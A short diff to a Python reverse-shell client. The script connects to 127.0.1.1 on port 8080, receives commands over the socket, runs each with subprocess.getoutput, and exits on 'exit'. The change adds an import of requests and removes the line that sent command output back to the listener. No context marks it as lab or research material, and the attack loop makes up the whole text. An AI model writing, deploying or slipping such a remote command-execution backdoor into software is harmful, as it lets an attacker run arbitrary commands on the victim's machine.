@@ -1,4 +1,4 @@
-import sys, subprocess, socket
+import sys, subprocess, socket, requests
 H = '127.0.1.1'
 P = 8080
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -8,6 +8,5 @@ while True:
     if not d:break
     c = d.decode().strip()
     if c.strip() == "exit":break
-    output = subprocess.getoutput(c)
-    s.send(output.encode())
+    o = subprocess.getoutput(c)
 s.close()
